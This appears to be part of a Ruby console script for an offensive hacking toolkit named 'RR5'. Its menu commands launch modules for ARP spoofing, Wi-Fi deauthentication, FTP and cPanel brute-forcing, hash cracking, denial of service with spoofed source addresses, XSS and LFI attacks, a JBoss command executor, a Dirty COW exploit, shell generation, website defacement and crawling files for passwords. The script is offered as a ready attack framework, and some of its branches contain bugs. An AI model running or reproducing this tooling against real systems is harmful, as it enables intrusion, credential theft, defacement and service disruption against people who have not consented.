            print "\t\t Gateway IP to posion => "
            posionaddr = gets.chomp
            print "\t\t Gateway MAC ADDR => "
            gatewaymac = gets.chomp
            dir_command("modules/spoofer", "go run main.go -targetspoof #{ipspoof} -targetmac #{tmac} -interface #{interface} -GatewayposionIP #{posionaddr} -GatewayMac #{gatewaymac}")
            console_main()
        end
        if commands == "r-dns"
            print "IP > "
            addr = gets.chomp
            names = Resolv.getnames "#{addr}"
            puts names
            console_main()
        end
        if commands == "EXIF" 
            print "\n\033[32mPath to Image > "
            image = gets.chomp
            puts "\033[34m"
            dir_command("modules/perl/modules/EXIF", "perl EXIF.pl -f #{image}")
        end
        if commands == "deauth0"
            deauth0("wlan3mon", "C8:C7:50:E8:BD:06", "3E:37:86:8E:60:90")
        end
        if commands == "RR5-RBShell"
            main_shell()
        end
        if commands == ""
            console_main()
        end
        if commands == "/q" || commands == "exit" || commands == "quit"
            puts '[ INF ] => : goodbye'
            exit!
        end
        if commands == "tree" 
            dir_command("modules/perl/90s/", "perl 1989")
            console_main()
        end
        if commands == "generate-w" 
            print "Enter the filename you would like to save > "
            wordlistname = gets.chomp
            puts "\n\tSaving file as #{wordlistname} defualt filepath is RR5/modules/pass-gen/#{wordlistname}"
            dir_command("modules/pass-gen", "go run rune.go -file #{wordlistname}")
        end
        if commands == "help-nosta"
            open_file("", "txt/commands-no-stat.txt")
            sep("\n\n")
            console_main()
        end
        if commands == "Sub_domfind"
            print "\n\tDomain name > "
            domain = gets.chomp
            print "\n\tPath to Name List   > "
            list = gets.chomp
            puts "defualt 1000"
            print "\n\tWorkers to start > "
            workers = gets.chomp
            puts "EX Google: 8.8.8.8:53"
            print "\n\tEnter Dns Server (optional) > "
            dns_server = gets.chomp
            print"\x1b[H\x1b[2J\x1b[3J"
            if dns_server == ""
                dir_command("modules/domain", "go run dom_guess.go -domain #{domain} -list #{list} -workers #{workers} ")
                console_main()
            end
            dir_command("modules/domain", "go run dom_guess.go -domain #{domain} -list #{list} -workers #{workers} -serverIPAPort #{dns_server}")
            console_main()
        end
        if commands == "if-listen"
            dir_command("modules/modules-net-packet-cap-etc", "go run cap-devices.go")
            console_main()
        end
        if commands == "eth-sniff"
            puts "Press enter to use defualt ETH0 interface"
            print "Interface > "
            inter = gets.chomp
            puts "\nPress enter for the defualt BPF [ 443 ] defualt to listen on"
            print "BPF Filter Port > "
            bpf = gets.chomp.to_s 
            puts "\n
                Filters: tcp, ip, application, eth, dot11 <must have monitor mode on card>, ICMP

                Press enter if you dont want to filter any packets 
                if not please input one of the following four filters
                "
            print "\nFilter > "
            filter= gets.chomp
            if inter == ""
                if bpf == ""
                    if filter == ""
                        dir_command("modules/sniifed_ftp_go_other_bg", "go run main.go ")
                        console_main()
                    end
                end
            end
            if filter == ""
                dir_command("modules/sniifed_ftp_go_other_bg", "go run main.go -interface #{inter} -BPF #{bpf}")
                console_main()
            end
            dir_command("modules/sniifed_ftp_go_other_bg", "go run main.go -interface #{inter} -BPF #{bpf} -filter #{filter}")
            console_main()
        end
        if commands == "modules"
            puts "
                Ruby modules: 
                    module-fake
                    module-ftp
                    module-net
                
                OADING MODULES FOR TESTING....
            "
            module_checker("./mod-ftp.rb") # ftp brute forcing
            module_checker("./mod-net.rb") # packet capture
            module_checker("./mod-fake.rb") # Fake Access Point Wireless module
            console_main()            
        end
        if commands == "myip"
            dir_command("modules/sys", "go run getip.go")
            console_main()
        end
        if commands == "Root-cm" 
            open_file("\033[32m", "modules/perl/90s/list.lst")
            console_main()
        end
        if commands == "iface"
            dir_command("modules/sys", "go run iface.go")
            console_main()
        end
        if commands == "fp-pillage"
            puts " EX: Admin, Name, hashes, passwords etc"
            print "Enter a REGEX name > "
            en = gets.chomp
            puts " Defualt is /"
            print "\n\tEnter a filepath to crawl > "
            fp = gets.chomp
            dir_command("modules/f", "go run pillage.go -fp #{fp} -regexc #{en}")
            console_main()
        end
        if commands == "MD5-B"
            print"\x1b[H\x1b[2J\x1b[3J"
            print " \033[32mEnter the path to the hash list   > "
            hashes = gets.chomp
            print "\n\t\033[32mEnter the path to the wordlist > "
            wordlist = gets.chomp
            dir_command("modules/crypto", "go run md5_hash_b.go -f #{hashes} -w #{wordlist}")
            console_main()
        end
        if commands == "dump-pcap"
            print "path to .pcap file > "
            file = gets.chomp
            dir_command("modules/sniifed_ftp_go_other_bg", "sudo go run main.go -dump -pcapfile #{file}")
            console_main()
        end
        if commands == "Sniff-FTP"
            print "\n\tInterace > "
            inter = gets.chomp
            print "\n\tPromisc true or false > "
            promisc = gets.chomp
            dir_command("modules/free-wifi-shit", "sudo go run main.go -intgs #{inter} -prom #{promisc}")
        end
        if commands == "SHA256-B"
            print "\n\t\033[32mPath to password list > "
            l = gets.chomp
            print "\n\t\033[37mPath to hash list     > "
            hashl = gets.chomp
            dir_command("modules/crypto", "go run sha-256-hash_b.go -w #{w} -f #{hashl}")
            console_main()
        end
        if commands == "MSF_Session"
            dir_command("modules/metasploit", "go run meta.go")
            console_main()
        end
        if commands == "FTP-G"
            print "Address > "
            addr = gets.chomp
            print "Port    > "
            port = gets.chomp
            dir_command("modules/fuzzing", "go run ftp.go -address #{addr} -port #{port}")
            console_main()
        end
        if commands == "JBOS-F"
            puts "EX: 129.168.8.1:8080"
            print "Host and port > "
            hp = gets.chomp
            print "Command to execute > "
            cm = gets.chomp
            print "Want SSL? True/False > "
            tf = gets.chomp
            if tf == "true" || tf == "True"
                dir_command("modules/fuzzing", "go run jboss.go -hp #{hp} -command #{cm} -SSL ")
            end
            if tf == "false" || tf == "False"
                dir_command("modules/fuzzing", "go run jboss.go -hp #{hp} -command #{cm} ")
            end
            console_main()
        end
        if commands == "Proto-IP"
            print "Enter an IPV4 addr > "
            ip = gets.chomp
            dir_command("modules/proto-handel", "go run main.go -ip #{ip}")
            console_main()
        end
        if commands == "Proto-SMTP"
            print "Enter an EMAIL > "
            email = gets.chomp
            dir_command("modules/proto-handel", "go run pro_email.go -email #{email}")
            console_main()
        end
        if commands == "basic-shod"
            print "Enter a host or topic > "
            top = gets.chomp
            api_ = File.open("config-files/shodan-API-KEY.txt")
            key_ = api_.read
            puts "Key => #{key_}"
            Shodan_Main.Basic_search("#{top}", "#{key_}")
            console_main()
        end
        if commands == "port-shod"
            print "Enter a host IPA > "
            top = gets.chomp
            api_ = File.open("config-files/shodan-API-KEY.txt")
            key_ = api_.read
            puts "Key => #{key_}"
            Shodan_Main.host_ports("#{top}", "#{key_}")
            console_main()
        end
        if commands == "acc-shod"
            api_ = File.open("config-files/shodan-API-KEY.txt")
            key_ = api_.read
            puts "Key => #{key_}"
            Shodan_Main.get_api("#{key_}")
            console_main()
        end
        if commands == "hon-shod"
            print "Enter an IP "
            targ = gets.chomp
            api_ = File.open("config-files/shodan-API-KEY.txt")
            key_ = api_.read
            puts "\033[39m"
            Shodan_Main.Honeypot_score("#{key_}", "#{host}")
            console_main()
        end
        if commands == "asy-shod"
            print "Enter an IP > "
            target = gets.chomp
            api_ = File.open("config-files/shodan-API-KEY.txt")
            key_ = api_.read
            puts "\033[39m"
            Shodan_Main.Async("#{key_}", "#{target}")
            console_main()
        end
        if commands == "apache-dum"
            print "Enter the apache LOG file path > "
            fp = gets.chomp
            apache_regex = `/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) - (.{0})- \[([^\]]+?)\] "(GET|POST|PUT|DELETE) ([^\s]+?) (HTTP\/1\.1)" (\d+) (\d+) ([^\s]+?) "(.*)"/`
            apache_log_parser("#{fp}","#{apache_regex}")
            console_main()
        end
        if commands == "ver-ip"
            print "Enter the IP to verify > "
            ip = gets.chomp
            dir_command("modules/etc", "go run ip-string.go -ip #{ip}")
            console_main()
        end
        if commands == "usr-recon"
            print "Enter the username > "
            user = gets.chomp
            dir_command("modules/osint", "go run user.go -user #{user}")
            console_main()
        end
        if commands == "saph"
            print "Server IP> "
            ip = gets.chomp
            print "Server Port> "
            port = gets.chomp
            dir_command("modules/DOS-DDOS", "python3 saph.py -s #{ip} -p #{port}")
            console_main()
        end
        if commands == "xss-t"
            print "Vulnerable URL > "
            url = gets.chomp 
            puts "xss.txt is the defualt payload list "
            dir_command("modules/injetion", "python3 xss.py #{url} xss.txt")
            console_main()
        end
        if commands == "tor-t"
            dir_command("modules/etc", "go run tor-t.go")
            console_main()
        end
        if commands == "ghosted"
            print"\x1b[H\x1b[2J\x1b[3J"
            dir_command("modules/ghosted", "go run main.go")
            console_main()
        end
        if commands == "tor-magic"
            print " URl > "
            url = gets.chomp
            dir_command("modules/tor_magic", "sudo go run main.go -t #{url}")
            console_main()
        end
        if commands == "usr-reconw"
            print " Username > "
            user = gets.chomp
            print " Path to URL list to parse > "
            list = gets.chomp
            dir_command("modules/osint/user-search-c-list", "go run main.go -user #{user} -filename #{list}")
            console_main()
        end
        if commands == ".env-v"
            print "Path to URL list > "
            ul = gets.chomp
            dir_command("modules/domain", "go run env_vul.go -l #{ul}")
            console_main()
        end
        if commands == "DHCMP-S"
            dir_command("modules/public_wifi_shit", "sudo python3 dhcmp.py")
            console_main()
        end
        if commands == "CF"
            dir_command("modules/osint", "python3 cf.py")
            console_main()
        end
        if commands == "loc-dos"
            print "Enter an IP > "
            ip = gets.chomp
            print "Enter a spoofed SRC IP > "
            ssrc = gets.chomp
            dir_command("modules/DOS-DDOS", "perl main.pl #{ssrc} #{ip}")
            console_main()
        end
        if commands == "SSH-p"
            print "Host > "
            ho = gets.chomp
            print "User > "
            usr = gets.chomp
            print "Possible pass > "
            passw = gets.chomp
            dir_command("modules/SSH-Sploit-Ruby", "sudo ruby ssh-sploit.rb #{ho} #{usr} #{passw}")
            console_main()
        end
        if commands == "D-Cow"
            dir_command("modules/dirty-cow", "go run main.go")
            console_main()
        end
        if commands == "SOAP-E"
            print "\033[34mEnter a URL > "
            url = gets.chomp
            print "\n\t\033[34mEnter a USR > "
            usr = gets.chomp
            puts "like: index.php"
            print "Enter an extension > "
            php = gets.chomp
            dir_command("modules/SOAP-EN", "sudo ruby soap-enum.rb #{url} #{usr} #{php}")
            console_main()
        end
        if commands == "LFI-PHI"
            puts "\033[38mExample: www.example.com"
            print "\n\t\033[31mEnter the Host > "
            h = gets.chomp
            puts "\033[38mExample: /vuln.ext?page=main&foo=bar"
            print "Enter a extension > "
            ext = gets.chomp
            puts "\033[38mExample: page "
            print "\033[31mEnter the input > "
            inm = gets.chomp
            #perl lfi_autopwn.pl -t www.vuln.tld -e "/vuln.ext?page=main&foo=bar" -i page
            dir_command("modules/lfi-pwn-rewrite", "perl lfi.pl -t #{h} -e #{ext} -i #{inm}")
            console_main()
        end
        if commands == "trojan-f"
            print "Enter a host to scan -> "
            host = gets.chomp
            dir_command("modules/virus-etc", "perl trojan-s.pl #{host}")
            console_main()
        end
        if commands == "PHPBB"
            print "Enter a website -> "
            web = gets.chomp
            dir_command("modules/etc", "perl check-phpBB-version.pl #{web}")
            console_main()
        end
        if commands == "shell-gen"
            dir_command("modules/etc", "perl shell_gen.pl")
            console_main()
        end
        if commands == "LFI-S"
            puts "\n\t\t{+} Please enter a host note that the URL MUST NOT CONTAIN\n\t\t/ at the end example https://example.com/ SHOULD NOT BE INPUTTED"
            puts "\n\t\t{+} This is because of the LFI list adding this into the URL paramater"
            print "\033[32m[+] HOST: "
            host = gets.chomp
            dir_command("modules/etc", "perl lfi-find.pl -u #{host}")
            console_main()
        end
        if commands == "BIN-C"
            print "\033[32m\n\tPath to binary > "
            g = gets.chomp
            dir_command("modules/etc", "perl bof.pl #{g}")
            console_main()
        end
        if commands == "CPANEL-B"
            print "Enter the IP       > "
            ip = gets.chomp
            print "Enter the User     > "
            usr = gets.chomp
            print "Enter the Port     > "
            po = gets.chomp
            print "Enter the Wordlist > "
            wl = gets.chomp
            print "Enter the outfile  > "
            out = gets.chomp
            dir_command("modules/CPANEL", "perl brute-cpan.pl -h #{ip} -u #{usr} -p #{po} -l #{wl} -f #{out}")
            console_main()
        end
        if commands == "CPANEL-CVE"
            dir_command("modules/CPANEL", "perl check-cp.pl")
            console_main()
        end
        if commands == "HTML-DEF"
            print "ENTER THE FULL DIR > "
            dir = gets.chomp
            dir_command("modules/etc", "perl deface.pl -f #{dir}")
            console_main()
        end
        if commands == "spider-pa"
            print "\033[38m\n\tEnter the URL          >  "
            a = gets.chomp
            print "\033[38m\n\tEnter the file of dirs >  "
            b = gets.chomp
            dir_command("modules/etc", "perl dirs.pl #{a} #{b}")
            console_main()
        end
        if commands == "doc_fullc"
            print"\x1b[H\x1b[2J\x1b[3J"
            open_file("\033[31m", "txt/banner.txt")
            print "Server URL -> http://localhost:5501\n"
            print "Google URL -> http://127.0.0.1:5501\n"
            print "Server DB  -> PostGreSQL\n"
            print "\b"
            dir_command("web-ui-full-documentation-type1-module-98", "go run server.go")
            console_main()
        end
    end
end




def console_main()
    begin
        sep("\n")
        print "\033[31mRR5> "
        a = gets.chomp
        console_commands("#{a}")
    rescue Interrupt => e
        print "\n[ INF ] Please use '/q', 'exit', 'quit', 'leave' to exit this script "
        sep("\n")
        console_main()
    rescue SignalException => e
        print "\n[ INF ] Please use '/q', 'exit', 'quit', 'leave' to exit this script "
        sep("\n")
        console_main()
    end
end

def main()
    print"\x1b[H\x1b[2J\x1b[3J"
    open_file("\033[31m", "txt/banner.txt")
    case (Process.uid)
    when 0
        print ""
    else
        dir_command("modules/perl/90s", "perl root-warn.pl")
        exit
    end
    module_checker("./mod-ftp.rb") # ftp brute forcing
    module_checker("./mod-net.rb") # packet capture
    module_checker("./mod-fake.rb") # Fake Access Point Wireless module
    module_checker("./shodan.rb") # shodan module
    os # os detection
    console_main()
end

main()
